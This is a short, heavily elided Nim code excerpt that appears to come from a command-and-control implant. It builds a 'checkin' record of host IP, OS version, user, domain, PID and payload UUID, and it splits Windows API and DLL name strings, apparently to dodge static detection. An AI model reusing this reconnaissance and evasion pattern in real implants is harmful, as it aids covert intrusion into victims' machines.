...
when defined(windows):
    ...
    proc rtlGetVersion(lpVersionInformation: var OSVersionInfoExW): NTSTATUS
      {.cdecl, importc: "RtlGet" & "Version", dynlib: "ntd" & "ll." & "dll".}
...
proc createCheckIn*(curConfig: Config): CheckIn =
    ...
    result = CheckIn(action: "checkin", ip: getIP(hostname), os: getVersion(), user: getUser(), host: hostname, domain: getDomain(), pid: getPID(), uuid: curConfig.PayloadUUID, architecture: hostCPU)
